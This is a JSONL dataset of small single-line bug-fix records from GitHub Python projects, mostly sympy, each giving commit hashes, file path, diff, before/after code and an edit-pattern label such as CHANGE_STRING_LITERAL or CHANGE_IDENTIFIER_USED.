{"project": "sympy", "commit_sha": "169d2b919ec874642dfa33172a92a3bd63fe7d57", "parent_sha": "1e938d64a1947006cbdcc0ab6facb0b2439edcf1", "file_path": "sympy/codegen/tests/test_rewriting.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -170,4 +170,4 @@ def test_create_expand_pow_optimization():\n     sin4x = sin(x)**4\n     assert ccode(optimize(sin4x, [my_opt])) == 'pow(sin(x), 4)'\n \n-    assert ccode(optimize((x**(-4)), [my_opt])) == 'x**(-4)'\n+    assert ccode(optimize((x**(-4)), [my_opt])) == 'pow(x, -4)'\n", "before": "assert ccode ( optimize ( ( x ** ( - 4 ) ) , [ my_opt ] ) ) == 'x**(-4)'", "after": "assert ccode ( optimize ( ( x ** ( - 4 ) ) , [ my_opt ] ) ) == 'pow(x, -4)'", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'x**(-4)'\", 3, 52, 3, 61], \"'pow(x, -4)'\"]]"}
{"project": "sympy", "commit_sha": "a08ca4d0e3ac24da001234685225b685feb6bc62", "parent_sha": "216f7933f3b5d23240ff8a94ad028d2c7ab63609", "file_path": "sympy/stats/tests/test_finite_rv.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -323,7 +323,7 @@ def test_FinitePSpace():\n \n def test_symbolic_conditions():\n     B = Bernoulli('B', S(1)/4)\n-    b = symbols('d, b')\n+    b = symbols('b')\n     Y = P(Eq(B, b))\n     assert Y == \\\n     Piecewise((1/4, Eq(b, 1)), (0, True)) + Piecewise((3/4, Eq(b, 0)), (0, True))\n", "before": "b = symbols ( 'd, b' )", "after": "b = symbols ( 'b' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'d, b'\", 3, 17, 3, 23], \"'b'\"]]"}
{"project": "sympy", "commit_sha": "c86e0574564dddc277f79590c5be2966e8b8b890", "parent_sha": "75639b842f40f9dd98413247eefd14700ab751e2", "file_path": "sympy/codegen/tests/test_pyutils.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -5,5 +5,5 @@ def test_standard():\n     ast = Print('x y'.split(), \"coordinate: %12.5g %12.5g\")\n     assert render_as_module(ast, standard='python3') == \\\n         '\\n\\nprint(\"coordinate: %12.5g %12.5g\" % (x, y))'\n-    assert render_as_module(ast, standard='python3') == \\\n+    assert render_as_module(ast, standard='python2') == \\\n         '\\n\\nprint \"coordinate: %12.5g %12.5g\" % (x, y)'\n", "before": "assert render_as_module ( ast , standard = 'python3' ) == '\\n\\nprint \"coordinate: %12.5g %12.5g\" % (x, y)'", "after": "assert render_as_module ( ast , standard = 'python2' ) == '\\n\\nprint \"coordinate: %12.5g %12.5g\" % (x, y)'", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'python3'\", 3, 43, 3, 52], \"'python2'\"]]"}
{"project": "sympy", "commit_sha": "dc37ebe019a6a3e87363a174fd0157e8e255fb30", "parent_sha": "139f5deee5db7b41ece2a48328ce95a3558a9a0a", "file_path": "sympy/stats/tests/test_mix.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ def test_density():\n         sqrt(2)*exp(-(x - 1)**2/8)/(4*sqrt(pi))\n \n def test_MarginalDistribution():\n-    a1, p1, p2 = symbols('a1 p1 p2 p3', positive=True)\n+    a1, p1, p2 = symbols('a1 p1 p2', positive=True)\n     C = Multinomial('C', 2, p1, p2)\n     B = MultivariateBeta('B', a1, C[0])\n     MGR = MarginalDistribution(B, C[0])\n", "before": "a1 , p1 , p2 = symbols ( 'a1 p1 p2 p3' , positive = True )", "after": "a1 , p1 , p2 = symbols ( 'a1 p1 p2' , positive = True )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'a1 p1 p2 p3'\", 3, 26, 3, 39], \"'a1 p1 p2'\"]]"}
{"project": "sympy", "commit_sha": "0ca00e8399c9438daae76940292e383b79a13de5", "parent_sha": "c8ff016ffa9d141946b7228214edf18b8f221c3d", "file_path": "sympy/plotting/plot_implicit.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -201,7 +201,7 @@ def _get_meshes_grid(self):\n \n @doctest_depends_on(modules=('matplotlib',))\n def plot_implicit(expr, x_var=None, y_var=None, adaptive=True, depth=0,\n-                  points=300, line_color=\"Blue\", show=True, **kwargs):\n+                  points=300, line_color=\"blue\", show=True, **kwargs):\n", "before": "def plot_implicit ( expr , x_var = None , y_var = None , adaptive = True , depth = 0 , points = 300 , line_color = \"Blue\" , show = True , ** kwargs ) : ", "after": "def plot_implicit ( expr , x_var = None , y_var = None , adaptive = True , depth = 0 , points = 300 , line_color = \"blue\" , show = True , ** kwargs ) : ", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Blue\\\"\", 3, 42, 3, 48], \"\\\"blue\\\"\"]]"}
{"project": "sympy", "commit_sha": "d2aede4143ad27fccf6b75e035de6758f9d45962", "parent_sha": "b98319aa86bdc2917e6fe97906944e2556478a43", "file_path": "sympy/matrices/expressions/matmul.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ def as_coeff_matrices(self):\n         matrices = [x for x in self.args if x.is_Matrix]\n         coeff = Mul(*scalars)\n         if coeff.is_commutative is False:\n-            raise NotImplementedError(\"noncommutative coefficients in MatMul are not supported.\")\n+            raise NotImplementedError(\"noncommutative scalars in MatMul are not supported.\")\n \n         return coeff, matrices\n \n", "before": "raise NotImplementedError ( \"noncommutative coefficients in MatMul are not supported.\" )", "after": "raise NotImplementedError ( \"noncommutative scalars in MatMul are not supported.\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"noncommutative coefficients in MatMul are not supported.\\\"\", 3, 39, 3, 97], \"\\\"noncommutative scalars in MatMul are not supported.\\\"\"]]"}
{"project": "osc", "commit_sha": "ce998fbc2947ae116ec0fda4992899c464ec5a9f", "parent_sha": "a8f14bed609f4836788606720d3b5e973c820a7c", "file_path": "osc/commandline.py", "project_url": "https://github.com/lethliel/osc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6882,7 +6882,7 @@ Please submit there instead, or use --nodevelproject to force direct submission.\n                        print(\"This is: \" + result.get('project'), end=' ')\n                        if result.get('package'):\n                              print (\" / \" + result.get('package'))\n-                       repl = raw_input('\\nUse this this container? (y/n) ')\n+                       repl = raw_input('\\nUse this container? (y/n) ')\n                        if repl.lower() != 'y':\n                              searchresult = None\n            elif opts.user:\n", "before": "repl = raw_input ( '\\nUse this this container? (y/n) ' )", "after": "repl = raw_input ( '\\nUse this container? (y/n) ' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'\\\\nUse this this container? (y/n) '\", 3, 41, 3, 76], \"'\\\\nUse this container? (y/n) '\"]]"}
{"project": "sympy", "commit_sha": "d0556003caeda511018b8588661021aeacb69ef3", "parent_sha": "5a0c7ea7b64be0920d6c129e7a4263728b1d2ba0", "file_path": "sympy/printing/pretty/tests/test_pretty.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -301,7 +301,7 @@ def test_upretty_modifiers():\n     assert upretty( Symbol('Fmag') ) == u('|F|')\n     # Combinations\n     assert upretty( Symbol('xvecdot') ) == u('x\u20d7\u0307')\n-    assert upretty( Symbol('xDotVec') ) == u('\u1e8b\u20d7')\n+    assert upretty( Symbol('xDotVec') ) == u('x\u0307\u20d7')\n     assert upretty( Symbol('xHATNorm') ) == u('\u2016x\u0302\u2016')\n     assert upretty( Symbol('xMathring_yCheckPRM__zbreveAbs') ) == u('x\u030a_y\u030c \u030d__|z\u0306|')\n     assert upretty( Symbol('alphadothat_nVECDOT__tTildePrime') ) == u('\u03b1\u0307\u0302_n\u20d7\u0307__t\u0303 \u030d')\n", "before": "assert upretty ( Symbol ( 'xDotVec' ) ) == u ( '\u1e8b\u20d7') ", "after": "assert upretty ( Symbol ( 'xDotVec' ) ) == u ( 'x\u0307\u20d7') ", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'\\u1e8b\\u20d7')\", 3, 46, 3, 54], \"'x\\u0307\\u20d7')\"]]"}
{"project": "sympy", "commit_sha": "0833fdef25206ac3e3d920e5d5c8cc330be22d32", "parent_sha": "fd7219eb78e9b6503253481b9aed29f8534f0478", "file_path": "doc/generate_logos.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -233,7 +233,7 @@ def load_svg(fn):\n     return doc\n \n def save_svg(fn, doc):\n-    with open(fn, \"w\") as f:\n+    with open(fn, \"wb\") as f:\n         xmlstr = doc.toxml(\"utf-8\")\n         f.write(xmlstr)\n         logging.info(\" File saved: %s\" % fn)\n", "before": "with open ( fn , \"w\" ) as f : xmlstr = doc . toxml ( \"utf-8\" ) f . write ( xmlstr ) logging . info ( \" File saved: %s\" % fn )", "after": "with open ( fn , \"wb\" ) as f : xmlstr = doc . toxml ( \"utf-8\" ) f . write ( xmlstr ) logging . info ( \" File saved: %s\" % fn )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"w\\\"\", 3, 19, 3, 22], \"\\\"wb\\\"\"]]"}
{"project": "sympy", "commit_sha": "83f221fbd69098aff0f4431abf4e0b52d68b5a7f", "parent_sha": "9c0f0b4e6fbda4cb430ff848546670d2876e3889", "file_path": "sympy/core/tests/test_wester.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1875,5 +1875,5 @@ def test_T10():\n \n @XFAIL\n def test_T11():\n-    n,k = symbols('m k', integer=True, positive=True)\n+    n,k = symbols('n k', integer=True, positive=True)\n     limit(n**x/(x*product((1 + x/k), (k, 1, n))),n,oo) == gamma(x) #raises NotImplementedError\n", "before": "n , k = symbols ( 'm k' , integer = True , positive = True )", "after": "n , k = symbols ( 'n k' , integer = True , positive = True )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'m k'\", 3, 19, 3, 24], \"'n k'\"]]"}
{"project": "sympy", "commit_sha": "39b687c9183f9355961ffc39695da7613e2961ba", "parent_sha": "5c9fab9f608aab17d5149fc37d1ddfa412677be5", "file_path": "sympy/printing/tests/test_latex.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1785,7 +1785,7 @@ def test_WedgeProduct_printing():\n     from sympy.diffgeom.rn import R2\n     from sympy.diffgeom import WedgeProduct\n     wp = WedgeProduct(R2.dx, R2.dy)\n-    assert latex(wp) == r\"\\text{d}x \\wedge \\text{d}y\"\n+    assert latex(wp) == r\"\\operatorname{d}x \\wedge \\operatorname{d}y\"\n \n \n def test_issue_14041():\n", "before": "assert latex ( wp ) == r\"\\text{d}x \\wedge \\text{d}y\"", "after": "assert latex ( wp ) == r\"\\operatorname{d}x \\wedge \\operatorname{d}y\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:r\\\"\\\\text{d}x \\\\wedge \\\\text{d}y\\\"\", 3, 25, 3, 54], \"r\\\"\\\\operatorname{d}x \\\\wedge \\\\operatorname{d}y\\\"\"]]"}
{"project": "sympy", "commit_sha": "2119ad82a8e8b37e17ef60e174672aa147473bd8", "parent_sha": "92115472f50fc87dca05b42627a2a586c5c6adb5", "file_path": "sympy/printing/maple.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -156,7 +156,7 @@ def _print_NaN(self, expr):\n \n     def _get_matrix(self, expr, sparse=False):\n         if expr.cols == 0 or expr.rows == 0:\n-            _strM = 'Matrix([], storage = {storage}})'.format(\n+            _strM = 'Matrix([], storage = {storage})'.format(\n                 storage='sparse' if sparse else 'rectangular')\n         else:\n             _strM = 'Matrix({list}, storage = {storage})'.format(\n", "before": "_strM = 'Matrix([], storage = {storage}})' . format ( storage = 'sparse' if sparse else 'rectangular' )", "after": "_strM = 'Matrix([], storage = {storage})' . format ( storage = 'sparse' if sparse else 'rectangular' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'Matrix([], storage = {storage}})'\", 3, 21, 3, 55], \"'Matrix([], storage = {storage})'\"]]"}
{"project": "sympy", "commit_sha": "1f55046af2bcbe99b3d6f91d07929381e03581b6", "parent_sha": "2119ad82a8e8b37e17ef60e174672aa147473bd8", "file_path": "sympy/printing/tests/test_maple.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ def test_Pow():\n     # FIXME: not done yet.\n     g = implemented_function('g', Lambda(x, 2 * x))\n     assert maple_code(1 / (g(x) * 3.5) ** (x - y ** x) / (x ** 2 + y)) == \\\n-           \"(3.5*2*x).^(-x + y.^x)/(x.^2 + y)\"\n+           \"(3.5*2*x)^(-x + y^x)/(x^2 + y)\"\n     # For issue 14160\n     assert maple_code(Mul(-2, x, Pow(Mul(y, y, evaluate=False), -1, evaluate=False),\n                           evaluate=False)) == '-2*x/(y.*y)'\n", "before": "assert maple_code ( 1 / ( g ( x ) * 3.5 ) ** ( x - y ** x ) / ( x ** 2 + y ) ) == \"(3.5*2*x).^(-x + y.^x)/(x.^2 + y)\"", "after": "assert maple_code ( 1 / ( g ( x ) * 3.5 ) ** ( x - y ** x ) / ( x ** 2 + y ) ) == \"(3.5*2*x)^(-x + y^x)/(x^2 + y)\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"(3.5*2*x).^(-x + y.^x)/(x.^2 + y)\\\"\", 3, 12, 3, 47], \"\\\"(3.5*2*x)^(-x + y^x)/(x^2 + y)\\\"\"]]"}
{"project": "sympy", "commit_sha": "d26ed13cda8ca2ad32880e18a3e24bb17d4106bd", "parent_sha": "319d59eb708fb73a6e6e508354816ec0c1099e82", "file_path": "sympy/crypto/crypto.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1515,7 +1515,7 @@ def _rsa_key(\n                 'in the complete residue system Z[{}], but the cipher '\n                 'can still be valid if you restrict the domain to be '\n                 'the reduced residue system Z*[{}]. You can pass '\n-                'the flag multiprime=True if you want to suppress this '\n+                'the flag multipower=True if you want to suppress this '\n                 'warning.'\n                 .format(primes, n, n)\n                 ).warn()\n", "before": "'the flag multiprime=True if you want to suppress this '", "after": "'the flag multipower=True if you want to suppress this '", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'the flag multiprime=True if you want to suppress this '\", 3, 17, 3, 73], \"'the flag multipower=True if you want to suppress this '\"]]"}
{"project": "sympy", "commit_sha": "3f5508c2a265e70094666474e4595cb5de0f8360", "parent_sha": "0469e038cd4a210e767bee52a76dd5a6bbf3b0ba", "file_path": "sympy/core/numbers.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -149,7 +149,7 @@ def _decimal_to_Rational_prec(dec):\n \n def _literal_float(f):\n     \"\"\"Return True if n can be interpreted as a floating point number.\"\"\"\n-    pat = r\"[-+]?((\\d*\\.\\d+)|(\\d+\\.?))(eE[-+]?\\d+)?\"\n+    pat = r\"[-+]?((\\d*\\.\\d+)|(\\d+\\.?))([eE][-+]?\\d+)?\"\n     return bool(regex.match(pat, f))\n \n # (a,b) -> gcd(a,b)\n", "before": "pat = r\"[-+]?((\\d*\\.\\d+)|(\\d+\\.?))(eE[-+]?\\d+)?\"", "after": "pat = r\"[-+]?((\\d*\\.\\d+)|(\\d+\\.?))([eE][-+]?\\d+)?\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:r\\\"[-+]?((\\\\d*\\\\.\\\\d+)|(\\\\d+\\\\.?))(eE[-+]?\\\\d+)?\\\"\", 3, 11, 3, 53], \"r\\\"[-+]?((\\\\d*\\\\.\\\\d+)|(\\\\d+\\\\.?))([eE][-+]?\\\\d+)?\\\"\"]]"}
{"project": "sympy", "commit_sha": "9166efaee461cb558bd2a8543d83326172f306d3", "parent_sha": "864a0a099b771d8972510ab437268617a7a28b81", "file_path": "sympy/physics/continuum_mechanics/beam.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1618,7 +1618,7 @@ def _draw_load(self, pictorial, length):\n                     load_args = scaled_load.args\n                 else:\n                     if isinstance(load[0], Symbol):\n-                        raise ValueError(\"Magnitude of load: {} should not be a Symbol\".format(load))\n+                        raise ValueError(\"Magnitude of load: {} should not be a Symbol when pictorial is False. Try setting pictorial to True\".format(load))\n                     load_args = self.load.args\n \n                 load_eq = [i for i in load_args if list(i.atoms(SingularityFunction))[0].args[2] >= 0]\n", "before": "else : if isinstance ( load [ 0 ] , Symbol ) : raise ValueError ( \"Magnitude of load: {} should not be a Symbol\" . format ( load ) )", "after": "else : if isinstance ( load [ 0 ] , Symbol ) : raise ValueError ( \"Magnitude of load: {} should not be a Symbol when pictorial is False. Try setting pictorial to True\" . format ( load ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Magnitude of load: {} should not be a Symbol\\\"\", 3, 42, 3, 88], \"\\\"Magnitude of load: {} should not be a Symbol when pictorial is False. Try setting pictorial to True\\\"\"]]"}
{"project": "sympy", "commit_sha": "431aa052c0fe9ab7598db40092a294d463a815fe", "parent_sha": "e5b1622ad999a22d03ca890002f38acdac2c754e", "file_path": "sympy/printing/tests/test_maple.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -214,7 +214,7 @@ def test_MatrixSymbol():\n     assert maple_code(B * 2 * A) == \"2*B.A\"\n \n     assert maple_code(\n-        A * (B + 3 * Identity(n))) == \"A*(3*Matrix(n, shape = identity) + B)\"\n+        A * (B + 3 * Identity(n))) == \"A.3*Matrix(n, shape = identity) + B\"\n \n     assert maple_code(A ** (x ** 2)) == \"MatrixPower(A, x^2)\"\n     assert maple_code(A ** 3) == \"MatrixPower(A, 3)\"\n", "before": "assert maple_code ( A * ( B + 3 * Identity ( n ) ) ) == \"A*(3*Matrix(n, shape = identity) + B)\"", "after": "assert maple_code ( A * ( B + 3 * Identity ( n ) ) ) == \"A.3*Matrix(n, shape = identity) + B\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"A*(3*Matrix(n, shape = identity) + B)\\\"\", 3, 39, 3, 78], \"\\\"A.3*Matrix(n, shape = identity) + B\\\"\"]]"}
{"project": "sympy", "commit_sha": "e7cd507895595aaa0777e63af97c9d0591f0c6b8", "parent_sha": "dbbd5bdc5f8c3a05e8162bcd78a1ecd7a224d085", "file_path": "sympy/concrete/products.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -287,7 +287,7 @@ def _eval_product(self, term, limits):\n \n                 p1, p2 = p.as_coeff_Add()\n                 p1 = self._eval_product(p1, (k, a, n))\n-                p2 = self._eval_product(p1, (k, a, n))\n+                p2 = self._eval_product(p2, (k, a, n))\n                 return (p1 + p2) / q\n             else:\n                 p = self._eval_product(p, (k, a, n))\n", "before": "p2 = self . _eval_product ( p1 , ( k , a , n ) )", "after": "p2 = self . _eval_product ( p2 , ( k , a , n ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:p1\", 3, 41, 3, 43], \"p2\"]]"}
{"project": "sympy", "commit_sha": "12fc50bc80eef2a6d4a817b7aaf69941e8878723", "parent_sha": "405eda680cfececa71c31e5aa61787a8f0a32bee", "file_path": "sympy/series/fourier.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -482,7 +482,7 @@ class FiniteFourierSeries(FourierSeries):\n     def __new__(cls, f, limits, exprs):\n         f = sympify(f)\n         limits = sympify(limits)\n-        expr = sympify(exprs)\n+        exprs = sympify(exprs)\n \n         if not (type(exprs) == Tuple and len(exprs) == 3):  # exprs is not of form (a0, an, bn)\n             # Converts the expression to fourier form\n", "before": "expr = sympify ( exprs )", "after": "exprs = sympify ( exprs )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:expr\", 3, 9, 3, 13], \"exprs\"]]"}
{"project": "moto", "commit_sha": "773a49c40d02535e73dbc50081920a42d87d3219", "parent_sha": "4372c346d97cc7447116e0600b59296a1cc98788", "file_path": "moto/cloudformation/exceptions.py", "project_url": "https://github.com/chellman-delphix/moto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ class UnformattedGetAttTemplateException(Exception):\n class ValidationError(BadRequest):\n     def __init__(self, name_or_id, message=None):\n         if message is None:\n-            messgae=\"Stack:{0} does not exist\".format(name_or_id),\n+            message=\"Stack:{0} does not exist\".format(name_or_id),\n \n         template = Template(ERROR_RESPONSE)\n         super(ValidationError, self).__init__()\n", "before": "messgae = \"Stack:{0} does not exist\" . format ( name_or_id ) ,", "after": "message = \"Stack:{0} does not exist\" . format ( name_or_id ) ,", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:messgae\", 3, 13, 3, 20], \"message\"]]"}
{"project": "sympy", "commit_sha": "cf84b0d732dcb2c41dc6cbe14143672e72cbf1b7", "parent_sha": "b9179e80d2daa1bb6cba1ffe35ca9e6612e115c9", "file_path": "sympy/polys/factortools.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1147,7 +1147,7 @@ def dmp_ext_factor(f, u, K):\n         return lc, []\n \n     f, F = dmp_sqf_part(f, u, K), f\n-    s, g, r = dmp_sqf_norm(f, u, K)\n+    s, g, r = dmp_sqf_norm(F, u, K)\n \n     factors = dmp_factor_list_include(r, u, K.dom)\n \n", "before": "s , g , r = dmp_sqf_norm ( f , u , K )", "after": "s , g , r = dmp_sqf_norm ( F , u , K )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:f\", 3, 28, 3, 29], \"F\"]]"}
{"project": "sympy", "commit_sha": "d90bd04ba81d73765634bddfde448d452e530c66", "parent_sha": "d3ae62701d21bb07c941609d0fd0e045e55ff809", "file_path": "sympy/parsing/c/c_parser.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -171,7 +171,7 @@ def parse_str(self, source, flags):\n \n-            It determines the kind of node and calss the respective\n+            It determines the kind of node and calls the respective\n             transforation function for that node.\n \n             Raises\n", "before": "node and calss the respective", "after": "node and calls the respective", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:calss\", 1, 48, 1, 53], \"calls\"]]"}
{"project": "NeuNorm", "commit_sha": "347ac68f4cf5ba9a5821de2f675cc99f966ca87d", "parent_sha": "10e9356d35cd0d3b996980da8d779fe0c83b4a82", "file_path": "tests/NeuNorm/export_test.py", "project_url": "https://github.com/scikit-beam/NeuNorm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ class TestExportingPhase1(unittest.TestCase):\n         o_norm = Normalization()\n         o_norm.load(folder=sample_path)\n         o_norm.load(folder=ob_path, data_type='ob')\n-        self.assertRaises(IOError, o_norm.export, data_type='not_real_type')\n+        self.assertRaises(KeyError, o_norm.export, data_type='not_real_type')\n         \n     def test_do_nothing_if_nothing_to_export(self):\n         '''assert do nothing if nothing to export'''\n", "before": "self . assertRaises ( IOError , o_norm . export , data_type = 'not_real_type' )", "after": "self . assertRaises ( KeyError , o_norm . export , data_type = 'not_real_type' )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:IOError\", 3, 27, 3, 34], \"KeyError\"]]"}
{"project": "gcsfs", "commit_sha": "91adc210bce1f75ba013beaf47b86629d68180ed", "parent_sha": "9211b034cc56a789b8b52e8f6fc5e52125ddb22d", "file_path": "gcsfs/gcsfuse.py", "project_url": "https://github.com/martindurant/gcsfs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ class GCSFS(Operations):\n     @_tracemethod\n     def read(self, path, size, offset, fh):\n         fn = ''.join([self.root, path])\n-        f = self.cache[fn]\n+        f = self.cache[fh]\n         f.seek(offset)\n         out = f.read(size)\n         return out\n", "before": "f = self . cache [ fn ]", "after": "f = self . cache [ fh ]", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:fn\", 3, 24, 3, 26], \"fh\"]]"}
{"project": "gcsfs", "commit_sha": "360219dff3550fb2f6ddb48cd39d18932ce89e6e", "parent_sha": "b296fee74a453ed1b15b0eba675cf98648eda115", "file_path": "gcsfs/gcsfuse.py", "project_url": "https://github.com/martindurant/gcsfs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ class GCSFS(Operations):\n     @_tracemethod\n     def read(self, path, size, offset, fh):\n         fn = ''.join([self.root, path])\n-        f = self.cache[fn]\n+        f = self.cache[fh]\n         f.seek(offset)\n         out = f.read(size)\n         return out\n", "before": "f = self . cache [ fn ]", "after": "f = self . cache [ fh ]", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:fn\", 3, 24, 3, 26], \"fh\"]]"}
{"project": "gcsfs", "commit_sha": "94cc3767e6b30d3720ebad11cb59637af30dddb8", "parent_sha": "4aeb1acf8924dba7e1817c2f0cea76aea4003c77", "file_path": "gcsfs/core.py", "project_url": "https://github.com/martindurant/gcsfs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -480,7 +480,7 @@ class GCSFileSystem(object):\n                 validate_response(r, path)\n                 break\n             except (HtmlError, RequestException, RateLimitException, GoogleAuthError) as e:\n-                print(e)\n+                print(r)\n                 if retry == self.retries - 1:\n                     logger.exception(\"_call out of retries on exception: %s\", e)\n                     raise e\n", "before": "e : print ( e )", "after": "e : print ( r )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:e\", 3, 23, 3, 24], \"r\"]]"}
{"project": "RxPY", "commit_sha": "8c761b5ca3ea44622ec7bcc65ab55935a5658c65", "parent_sha": "97af9acb7ef6ec8e4f099ddc226aa141d895aff9", "file_path": "rx/concurrency/newthreadscheduler.py", "project_url": "https://github.com/mako-taco/RxPY", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class NewThreadScheduler(Scheduler):\n         t.start()\n \n         def dispose():\n-            disponsed[0] = True\n+            disposed[0] = True\n \n         return CompositeDisposable(disposable, Disposable(dispose))\n", "before": "disponsed [ 0 ] = True", "after": "disposed [ 0 ] = True", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:disponsed\", 3, 13, 3, 22], \"disposed\"]]"}
{"project": "django-connectwise", "commit_sha": "33407e2b3f8149f9ba48a8390a626f2415db80d0", "parent_sha": "f26c85c90b01a3d47ae925e4559b0d4635c4c66b", "file_path": "djconnectwise/api.py", "project_url": "https://github.com/trinitonesounds/django-connectwise", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -635,7 +635,7 @@ class TimeAPIClient(ConnectWiseAPIClient):\n         if work_role:\n             body.update({\n                 \"workRole\": {\n-                    \"name\": str(work_type)\n+                    \"name\": str(work_role)\n                 }\n             })\n \n", "before": "body . update ( { \"workRole\" : { \"name\" : str ( work_type ) } } )", "after": "body . update ( { \"workRole\" : { \"name\" : str ( work_role ) } } )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:work_type\", 3, 33, 3, 42], \"work_role\"]]"}
{"project": "bokeh", "commit_sha": "51161ed5a00043872fd27070a8b75157e08d4ad3", "parent_sha": "6cd4131588428a9e24a6269fd58eeb0629e561bd", "file_path": "bokeh/charts/_charts.py", "project_url": "https://github.com/suqi/bokeh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -350,7 +350,7 @@ class Chart(object):\n             x=x, y=y, fill_color=color, fill_alpha=0.9)\n \n         self._append_glyph(source, patch)\n-        return path\n+        return patch\n \n     def make_wedge(self, source, **kws):\n", "before": "return path", "after": "return patch", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:path\", 3, 16, 3, 20], \"patch\"]]"}
